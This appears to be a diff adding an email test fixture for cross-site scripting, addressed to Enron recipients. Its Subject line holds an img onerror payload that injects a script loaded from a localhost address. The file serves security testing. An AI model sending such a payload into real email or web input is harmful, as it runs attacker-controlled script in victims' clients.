@@ -1,0 +1,7 @@
+From: "Yoshi Latimer" <Howard_Snyder@mydomain.com>
+To: michael.tribolet@enron.com, rick.buy@enron.com, david.gorte@enron.com, 
+Subject: <img src=x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e)>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
